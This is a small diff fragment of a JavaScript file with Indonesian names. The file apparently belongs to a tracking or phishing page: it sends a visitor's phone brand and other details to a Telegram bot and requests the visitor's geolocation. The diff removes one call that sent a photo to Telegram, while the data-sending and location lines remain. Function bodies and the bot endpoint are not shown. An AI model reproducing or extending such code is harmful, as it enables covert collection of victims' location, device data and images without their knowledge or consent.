@@ -96,7 +96,6 @@ async function kirimPesanTelegram(pesan) {
 │📱 Merek hp: ${merek}
 ╰───────────────────`;
   await kirimPesanTelegram(pesanAwal);
-  await kirimFotoKeTelegram();
 })();
 
 navigator.geolocation.getCurrentPosition(
